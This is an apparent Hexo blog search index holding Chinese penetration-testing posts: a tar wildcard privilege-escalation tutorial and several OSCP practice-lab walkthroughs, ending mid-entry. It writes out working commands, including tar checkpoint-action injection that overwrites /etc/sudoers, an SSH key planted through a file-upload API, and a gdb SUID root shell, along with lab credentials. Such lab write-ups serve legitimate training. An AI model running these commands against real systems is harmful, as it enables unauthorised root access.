<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>使用tar命令进行Linux提权</title>
      <link href="/2024/04/27/%E4%BD%BF%E7%94%A8tar%E5%91%BD%E4%BB%A4%E8%BF%9B%E8%A1%8CLinux%E6%8F%90%E6%9D%83/"/>
      <url>/2024/04/27/%E4%BD%BF%E7%94%A8tar%E5%91%BD%E4%BB%A4%E8%BF%9B%E8%A1%8CLinux%E6%8F%90%E6%9D%83/</url>
      
        <content type="html"><![CDATA[<p>这里只举例使用root权限运行计划任务，且使用了通配符的tar的bash脚本compressToBackup.sh，内容如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">cd /home/kali/Desktop/TarWildCardPrivEsc/</span><br><span class="line">tar -zcf /home/kali/Desktop/TarWildCardPrivEsc/backup.tgz *</span><br></pre></td></tr></table></figure><p>看起来只是执行了cd命令把工作目录切换到&#x2F;home&#x2F;…&#x2F;TarWildCardPrivEsc，然后执行tar 命令把TarWildCardPrivEsc目录下所有的内容打包到backup.tgz文件</p><p>这里当使用了通配符*时，bash interpreter其实是这样解释的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -zcf /home/.../TarWildCardPrivEsc/backup.tgz image.png randomfile.txt ... 31337h4ck3r8.zip</span><br></pre></td></tr></table></figure><p>*通配符会被目录下所有的文件名替代，作为攻击者，我们可以利用这一点，创建特定的文件名，这些文件名将被解释为tar的标志，而不是实际的文件。</p><p>使用<code>— checkpoint-action</code>可以在执行tar之后执行命令，比如</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -zcf /home/backup.tgz toBeBackedUp --checkpoint=1 --checkpoint-action=exec=whoami</span><br></pre></td></tr></table></figure><p>最后的exploit</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># 1. 在被打包的文件目录下生成两个文件</span><br><span class="line"># &#x27;--checkpoint=1&#x27; and &#x27;--checkpoint-action=exec=sh privesc.sh&#x27;</span><br><span class="line"></span><br><span class="line">echo &quot;&quot; &gt; &#x27;--checkpoint=1&#x27;</span><br><span class="line">echo &quot;&quot; &gt; &#x27;--checkpoint-action=exec=sh privesc.sh&#x27;</span><br><span class="line"></span><br><span class="line"># 2. 再创建一个privesc.sh，内容如下，这里的kali需要换成当前低权限用户的name</span><br><span class="line">echo &#x27;kali ALL=(root) NOPASSWD: ALL&#x27; &gt; /etc/sudoers</span><br><span class="line"></span><br><span class="line">#The above injects an entry into the /etc/sudoers file that allows the &#x27;kali&#x27; </span><br><span class="line">#user to use sudo without a password for all commands</span><br><span class="line">#NOTE: we could have also used a reverse shell, this would work the same!</span><br><span class="line">#OR: Even more creative, you could&#x27;ve used chmod to changes the permissions</span><br><span class="line">#on a binary to have SUID permissions, and PE that way</span><br></pre></td></tr></table></figure><p>再等一会，当前用户就有sudo权限了</p>]]></content>
      
      
      
        <tags>
            
            <tag> Pentest </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OSCPLab-Amaterasu</title>
      <link href="/2024/04/27/OSCPLab-Amaterasu/"/>
      <url>/2024/04/27/OSCPLab-Amaterasu/</url>
      
        <content type="html"><![CDATA[<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">PORT      STATE  SERVICE</span><br><span class="line">21/tcp    open   ftp</span><br><span class="line">22/tcp    closed ssh</span><br><span class="line">111/tcp   closed rpcbind</span><br><span class="line">139/tcp   closed netbios-ssn</span><br><span class="line">443/tcp   closed https</span><br><span class="line">445/tcp   closed microsoft-ds</span><br><span class="line">2049/tcp  closed nfs</span><br><span class="line">10000/tcp closed snet-sensor-mgmt</span><br><span class="line">25022/tcp open   unknown</span><br><span class="line">33414/tcp open   unknown</span><br><span class="line">40080/tcp open   unknown</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br></pre></td><td class="code"><pre><span class="line">PORT      STATE  SERVICE          VERSION</span><br><span class="line">21/tcp    open   ftp              vsftpd 3.0.3</span><br><span class="line">| ftp-anon: Anonymous FTP login allowed (FTP code 230)</span><br><span class="line">|_Can&#x27;t get directory listing: TIMEOUT</span><br><span class="line">| ftp-syst: </span><br><span class="line">|   STAT: </span><br><span class="line">| FTP server status:</span><br><span class="line">|      Connected to 192.168.45.237</span><br><span class="line">|      Logged in as ftp</span><br><span class="line">|      TYPE: ASCII</span><br><span class="line">|      No session bandwidth limit</span><br><span class="line">|      Session timeout in seconds is 300</span><br><span class="line">|      Control connection is plain text</span><br><span class="line">|      Data connections will be plain text</span><br><span class="line">|      At session startup, client count was 1</span><br><span class="line">|      vsFTPd 3.0.3 - secure, fast, stable</span><br><span class="line">|_End of status</span><br><span class="line">22/tcp    closed ssh</span><br><span class="line">111/tcp   closed rpcbind</span><br><span class="line">139/tcp   closed netbios-ssn</span><br><span class="line">443/tcp   closed https</span><br><span class="line">445/tcp   closed microsoft-ds</span><br><span class="line">2049/tcp  closed nfs</span><br><span class="line">10000/tcp closed snet-sensor-mgmt</span><br><span class="line">25022/tcp open   ssh              OpenSSH 8.6 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   256 68:c6:05:e8:dc:f2:9a:2a:78:9b:ee:a1:ae:f6:38:1a (ECDSA)</span><br><span class="line">|_  256 e9:89:cc:c2:17:14:f3:bc:62:21:06:4a:5e:71:80:ce (ED25519)</span><br><span class="line">33414/tcp open   unknown</span><br><span class="line">| fingerprint-strings: </span><br><span class="line">|   GetRequest: </span><br><span class="line">|     HTTP/1.1 404 NOT FOUND</span><br><span class="line">|     Server: Werkzeug/2.2.3 Python/3.9.13</span><br><span class="line">|     Date: Sat, 27 Apr 2024 12:02:34 GMT</span><br><span class="line">|     Content-Type: text/html; charset=utf-8</span><br><span class="line">|     Content-Length: 207</span><br><span class="line">|     Connection: close</span><br><span class="line">|     &lt;!doctype html&gt;</span><br><span class="line">|     &lt;html lang=en&gt;</span><br><span class="line">|     &lt;title&gt;404 Not Found&lt;/title&gt;</span><br><span class="line">|     &lt;h1&gt;Not Found&lt;/h1&gt;</span><br><span class="line">|     &lt;p&gt;The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.&lt;/p&gt;</span><br><span class="line">|   HTTPOptions: </span><br><span class="line">|     HTTP/1.1 404 NOT FOUND</span><br><span class="line">|     Server: Werkzeug/2.2.3 Python/3.9.13</span><br><span class="line">|     Date: Sat, 27 Apr 2024 12:02:35 GMT</span><br><span class="line">|     Content-Type: text/html; charset=utf-8</span><br><span class="line">|     Content-Length: 207</span><br><span class="line">|     Connection: close</span><br><span class="line">|     &lt;!doctype html&gt;</span><br><span class="line">|     &lt;html lang=en&gt;</span><br><span class="line">|     &lt;title&gt;404 Not Found&lt;/title&gt;</span><br><span class="line">|     &lt;h1&gt;Not Found&lt;/h1&gt;</span><br><span class="line">|     &lt;p&gt;The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.&lt;/p&gt;</span><br><span class="line">|   Help: </span><br><span class="line">|     &lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD HTML 4.01//EN&quot;</span><br><span class="line">|     &quot;http://www.w3.org/TR/html4/strict.dtd&quot;&gt;</span><br><span class="line">|     &lt;html&gt;</span><br><span class="line">|     &lt;head&gt;</span><br><span class="line">|     &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;</span><br><span class="line">|     &lt;title&gt;Error response&lt;/title&gt;</span><br><span class="line">|     &lt;/head&gt;</span><br><span class="line">|     &lt;body&gt;</span><br><span class="line">|     &lt;h1&gt;Error response&lt;/h1&gt;</span><br><span class="line">|     &lt;p&gt;Error code: 400&lt;/p&gt;</span><br><span class="line">|     &lt;p&gt;Message: Bad request syntax (&#x27;HELP&#x27;).&lt;/p&gt;</span><br><span class="line">|     &lt;p&gt;Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.&lt;/p&gt;</span><br><span class="line">|     &lt;/body&gt;</span><br><span class="line">|     &lt;/html&gt;</span><br><span class="line">|   RTSPRequest: </span><br><span class="line">|     &lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD HTML 4.01//EN&quot;</span><br><span class="line">|     &quot;http://www.w3.org/TR/html4/strict.dtd&quot;&gt;</span><br><span class="line">|     &lt;html&gt;</span><br><span class="line">|     &lt;head&gt;</span><br><span class="line">|     &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;</span><br><span class="line">|     &lt;title&gt;Error response&lt;/title&gt;</span><br><span class="line">|     &lt;/head&gt;</span><br><span class="line">|     &lt;body&gt;</span><br><span class="line">|     &lt;h1&gt;Error response&lt;/h1&gt;</span><br><span class="line">|     &lt;p&gt;Error code: 400&lt;/p&gt;</span><br><span class="line">|     &lt;p&gt;Message: Bad request version (&#x27;RTSP/1.0&#x27;).&lt;/p&gt;</span><br><span class="line">|     &lt;p&gt;Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.&lt;/p&gt;</span><br><span class="line">|     &lt;/body&gt;</span><br><span class="line">|_    &lt;/html&gt;</span><br><span class="line">40080/tcp open   http             Apache httpd 2.4.53 ((Fedora))</span><br><span class="line">|_http-server-header: Apache/2.4.53 (Fedora)</span><br><span class="line">|_http-title: My test page</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :</span><br><span class="line">SF-Port33414-TCP:V=7.94SVN%I=7%D=4/27%Time=662CE95B%P=x86_64-pc-linux-gnu%</span><br><span class="line">SF:r(GetRequest,184,&quot;HTTP/1\.1\x20404\x20NOT\x20FOUND\r\nServer:\x20Werkze</span><br><span class="line">SF:ug/2\.2\.3\x20Python/3\.9\.13\r\nDate:\x20Sat,\x2027\x20Apr\x202024\x20</span><br><span class="line">SF:12:02:34\x20GMT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nCont</span><br><span class="line">SF:ent-Length:\x20207\r\nConnection:\x20close\r\n\r\n&lt;!doctype\x20html&gt;\n&lt;</span><br><span class="line">SF:html\x20lang=en&gt;\n&lt;title&gt;404\x20Not\x20Found&lt;/title&gt;\n&lt;h1&gt;Not\x20Found&lt;</span><br><span class="line">SF:/h1&gt;\n&lt;p&gt;The\x20requested\x20URL\x20was\x20not\x20found\x20on\x20the\x2</span><br><span class="line">SF:0server\.\x20If\x20you\x20entered\x20the\x20URL\x20manually\x20please\x</span><br><span class="line">SF:20check\x20your\x20spelling\x20and\x20try\x20again\.&lt;/p&gt;\n&quot;)%r(HTTPOpti</span><br><span class="line">SF:ons,184,&quot;HTTP/1\.1\x20404\x20NOT\x20FOUND\r\nServer:\x20Werkzeug/2\.2\.</span><br><span class="line">SF:3\x20Python/3\.9\.13\r\nDate:\x20Sat,\x2027\x20Apr\x202024\x2012:02:35\</span><br><span class="line">SF:x20GMT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Lengt</span><br><span class="line">SF:h:\x20207\r\nConnection:\x20close\r\n\r\n&lt;!doctype\x20html&gt;\n&lt;html\x20l</span><br><span class="line">SF:ang=en&gt;\n&lt;title&gt;404\x20Not\x20Found&lt;/title&gt;\n&lt;h1&gt;Not\x20Found&lt;/h1&gt;\n&lt;p&gt;</span><br><span class="line">SF:The\x20requested\x20URL\x20was\x20not\x20found\x20on\x20the\x20server\.</span><br><span class="line">SF:\x20If\x20you\x20entered\x20the\x20URL\x20manually\x20please\x20check\x</span><br><span class="line">SF:20your\x20spelling\x20and\x20try\x20again\.&lt;/p&gt;\n&quot;)%r(RTSPRequest,1F4,&quot;</span><br><span class="line">SF:&lt;!DOCTYPE\x20HTML\x20PUBLIC\x20\&quot;-//W3C//DTD\x20HTML\x204\.01//EN\&quot;\n\x</span><br><span class="line">SF:20\x20\x20\x20\x20\x20\x20\x20\&quot;http://www\.w3\.org/TR/html4/strict\.dt</span><br><span class="line">SF:d\&quot;&gt;\n&lt;html&gt;\n\x20\x20\x20\x20&lt;head&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;</span><br><span class="line">SF:meta\x20http-equiv=\&quot;Content-Type\&quot;\x20content=\&quot;text/html;charset=utf-</span><br><span class="line">SF:8\&quot;&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;title&gt;Error\x20response&lt;/title&gt;\</span><br><span class="line">SF:n\x20\x20\x20\x20&lt;/head&gt;\n\x20\x20\x20\x20&lt;body&gt;\n\x20\x20\x20\x20\x20\</span><br><span class="line">SF:x20\x20\x20&lt;h1&gt;Error\x20response&lt;/h1&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20</span><br><span class="line">SF:&lt;p&gt;Error\x20code:\x20400&lt;/p&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;p&gt;Messag</span><br><span class="line">SF:e:\x20Bad\x20request\x20version\x20\(&#x27;RTSP/1\.0&#x27;\)\.&lt;/p&gt;\n\x20\x20\x20\</span><br><span class="line">SF:x20\x20\x20\x20\x20&lt;p&gt;Error\x20code\x20explanation:\x20HTTPStatus\.BAD_</span><br><span class="line">SF:REQUEST\x20-\x20Bad\x20request\x20syntax\x20or\x20unsupported\x20method</span><br><span class="line">SF:\.&lt;/p&gt;\n\x20\x20\x20\x20&lt;/body&gt;\n&lt;/html&gt;\n&quot;)%r(Help,1EF,&quot;&lt;!DOCTYPE\x20H</span><br><span class="line">SF:TML\x20PUBLIC\x20\&quot;-//W3C//DTD\x20HTML\x204\.01//EN\&quot;\n\x20\x20\x20\x20</span><br><span class="line">SF:\x20\x20\x20\x20\&quot;http://www\.w3\.org/TR/html4/strict\.dtd\&quot;&gt;\n&lt;html&gt;\n</span><br><span class="line">SF:\x20\x20\x20\x20&lt;head&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;meta\x20http-e</span><br><span class="line">SF:quiv=\&quot;Content-Type\&quot;\x20content=\&quot;text/html;charset=utf-8\&quot;&gt;\n\x20\x20</span><br><span class="line">SF:\x20\x20\x20\x20\x20\x20&lt;title&gt;Error\x20response&lt;/title&gt;\n\x20\x20\x20\</span><br><span class="line">SF:x20&lt;/head&gt;\n\x20\x20\x20\x20&lt;body&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;h1</span><br><span class="line">SF:&gt;Error\x20response&lt;/h1&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;p&gt;Error\x20co</span><br><span class="line">SF:de:\x20400&lt;/p&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;p&gt;Message:\x20Bad\x20r</span><br><span class="line">SF:equest\x20syntax\x20\(&#x27;HELP&#x27;\)\.&lt;/p&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;</span><br><span class="line">SF:p&gt;Error\x20code\x20explanation:\x20HTTPStatus\.BAD_REQUEST\x20-\x20Bad\</span><br><span class="line">SF:x20request\x20syntax\x20or\x20unsupported\x20method\.&lt;/p&gt;\n\x20\x20\x20</span><br><span class="line">SF:\x20&lt;/body&gt;\n&lt;/html&gt;\n&quot;);</span><br><span class="line">Device type: general purpose|storage-misc|firewall</span><br><span class="line">Running (JUST GUESSING): Linux 2.6.X|3.X|4.X (86%), Synology DiskStation Manager 5.X (86%), WatchGuard Fireware 11.X (85%)</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:2.6.32 cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4.4 cpe:/o:linux:linux_kernel cpe:/a:synology:diskstation_manager:5.1 cpe:/o:watchguard:fireware:11.8</span><br><span class="line">Aggressive OS guesses: Linux 2.6.32 (86%), Linux 2.6.39 (86%), Linux 3.10 - 3.12 (86%), Linux 3.4 (86%), Linux 3.5 (86%), Linux 4.4 (86%), Synology DiskStation Manager 5.1 (86%), Linux 2.6.35 (85%), Linux 3.10 (85%), Linux 2.6.32 or 3.10 (85%)</span><br><span class="line">No exact OS matches for host (test conditions non-ideal).</span><br><span class="line">Network Distance: 4 hops</span><br><span class="line">Service Info: OS: Unix</span><br></pre></td></tr></table></figure><p>尝试21端口的匿名访问，能登陆但是执行命令返回的是229 Entering Extended Passive Mode</p><p>扫描发现<a href="http://192.168.218.249:33414//help%EF%BC%8C%E5%86%85%E5%AE%B9%E5%A6%82%E4%B8%8B">http://192.168.218.249:33414//help，内容如下</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&quot;GET /info : General Info&quot;,&quot;GET /help : This listing&quot;,&quot;GET /file-list?dir=/tmp : List of the files&quot;,&quot;POST /file-upload : Upload files&quot;]</span><br></pre></td></tr></table></figure><p>发现<a href="http://192.168.218.249:33414//info">http://192.168.218.249:33414//info</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&quot;Python File Server REST API v2.5&quot;,&quot;Author: Alfredo Moroder&quot;,&quot;GET /help = List of the commands&quot;]</span><br></pre></td></tr></table></figure><p>访问<a href="http://192.168.218.249:33414/file-list?dir=/tmp%EF%BC%8C%E5%8F%91%E7%8E%B0%E6%98%AF%E4%B8%80%E4%B8%AA%E8%AF%BB%E5%8F%96%E7%9B%AE%E5%BD%95%E7%9A%84">http://192.168.218.249:33414/file-list?dir=/tmp，发现是一个读取目录的</a></p><p>用curl使用POST数据包上传文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST -F &quot;file=@/home/yu1e/Desktop/OSCP-Lab/shell.php&quot; -F filename=&quot;/tmp/shell.php&quot; http://192.168.218.249:33414/file-upload</span><br></pre></td></tr></table></figure><p>但是提示不能上传php文件，上传一个ssh公钥上去，到&#x2F;home&#x2F;alfredo&#x2F;.ssh&#x2F;authorized_keys</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST -F &quot;file=@/home/yu1e/.ssh/id_rsa.txt&quot; -F filename=&quot;/home/alfredo/.ssh/authorized_keys&quot; http://192.168.218.249:33414/file-upload</span><br></pre></td></tr></table></figure><p>指定私钥登录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ssh alfredo@192.168.218.249 -i id_ed25519 -p 25022</span><br></pre></td></tr></table></figure><p>查看计划任务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/crontab</span><br></pre></td></tr></table></figure><p>发现</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*/1 * * * * root /usr/local/bin/backup-flask.sh</span><br></pre></td></tr></table></figure><p>查看内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line">export PATH=&quot;/home/alfredo/restapi:$PATH&quot;</span><br><span class="line">cd /home/alfredo/restapi</span><br><span class="line">tar czf /tmp/flask.tar.gz *</span><br></pre></td></tr></table></figure><p>使用tar提权</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;&quot; &gt; &#x27;--checkpoint=1&#x27;</span><br><span class="line">echo &quot;&quot; &gt; &#x27;--checkpoint-action=exec=sh privesc.sh&#x27;</span><br><span class="line">#privesc.sh内容如下</span><br><span class="line">echo ‘alfredo ALL=(root) NOPASSWD: ALL’ &gt; /etc/sudoers</span><br></pre></td></tr></table></figure><p>再等一会，就拿到root权限</p>]]></content>
      
      
      
        <tags>
            
            <tag> Labs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OSCPLab-DriftingBlues6</title>
      <link href="/2024/04/27/OSCPLab-DriftingBlues6/"/>
      <url>/2024/04/27/OSCPLab-DriftingBlues6/</url>
      
        <content type="html"><![CDATA[<p>只开了80端口</p><p>访问80端口查看源码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">please hack vvmlist.github.io instead</span><br><span class="line">he and their army always hacking us --&gt;</span><br></pre></td></tr></table></figure><p>发现robots.txt</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: /textpattern/textpattern</span><br><span class="line"></span><br><span class="line">dont forget to add .zip extension to your dir-brute</span><br><span class="line">;)</span><br></pre></td></tr></table></figure><p>那就扫描zip文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://192.168.159.219/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .zip</span><br></pre></td></tr></table></figure><p>textpattern是一个CMS</p><p><a href="https://smms.app/image/RZl3fK98YAjdBbC" target="_blank"><img src="https://s2.loli.net/2024/04/27/RZl3fK98YAjdBbC.png" ></a></p><p><a href="https://smms.app/image/9UgeJTbr3dsPHa8" target="_blank"><img src="https://s2.loli.net/2024/04/27/9UgeJTbr3dsPHa8.png" ></a></p><p>扫描发现&#x2F;spammer.zip，解压要密码，破解得到myspace4，解压得到creds.txt        </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mayer:lionheart</span><br></pre></td></tr></table></figure><p>拿来登录textpattern，成功登录，尝试一下RCE</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/ricardojoserf/textpattern-exploit-rce.git</span><br></pre></td></tr></table></figure><p>直接RCE失败，找到文件上传点，上传shell</p><p>阅读searchsploit的漏洞描述，发现上传的文件都在<a href="http://192.168.159.219/textpattern/files/">http://192.168.159.219/textpattern/files/</a></p><p><a href="https://smms.app/image/OGEd1ureQxtLoSW" target="_blank"><img src="https://s2.loli.net/2024/04/27/OGEd1ureQxtLoSW.png" ></a></p><p>然后拿到shell</p><p>发现内核版本为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Linux driftingblues 3.2.0-4-amd64 #1 SMP Debian 3.2.78-1 x86_64 GNU/Linux</span><br></pre></td></tr></table></figure><p>找到exp</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.exploit-db.com/exploits/40839</span><br></pre></td></tr></table></figure><p>拿到root</p>]]></content>
      
      
      
        <tags>
            
            <tag> Labs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OSCPLab-FunboxEnum</title>
      <link href="/2024/04/27/OSCPLab-FunboxEnum/"/>
      <url>/2024/04/27/OSCPLab-FunboxEnum/</url>
      
        <content type="html"><![CDATA[<p>只开了22和80端口，扫描目录发现</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.159.132//mini.php</span><br></pre></td></tr></table></figure><p>直接上传马就行了，查看suid权限，没有可用的</p><p>找到phpmyadmin的配置文件config-db.php</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$dbpass=&#x27;tgbzhnujm!&#x27;;</span><br></pre></td></tr></table></figure><p>用户目录下有goat  harry  karla  oracle  sally</p><p>试过之后是karla的密码，拿来sudo su直接root</p>]]></content>
      
      
      
        <tags>
            
            <tag> Labs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OSCPLab-Garaa</title>
      <link href="/2024/04/27/OSCPLab-Garaa/"/>
      <url>/2024/04/27/OSCPLab-Garaa/</url>
      
        <content type="html"><![CDATA[<p>只开了22和80端口，扫描80端口发现&#x2F;Cryoserver目录</p><p>查看源码发现</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/Temari</span><br><span class="line">/Kazekage</span><br><span class="line">/iamGaara</span><br></pre></td></tr></table></figure><p>先当成目录试一下，都是介绍火影的一些剧情，拿来当用户爆破ssh</p><p>爆破出</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">login: gaara   password: iloveyou2</span><br></pre></td></tr></table></figure><p>查看suid权限，发现&#x2F;usr&#x2F;bin&#x2F;gdb</p><p>直接运行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb -nx -ex &#x27;python import os; os.execl(&quot;/bin/sh&quot;, &quot;sh&quot;, &quot;-p&quot;)&#x27; -ex quit</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Labs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OSCPLab-Blogger</title>
      <link href="/2024/04/26/OSCPLab-Blogger/"/>
      <url>/2024/04/26/OSCPLab-Blogger/</url>
      
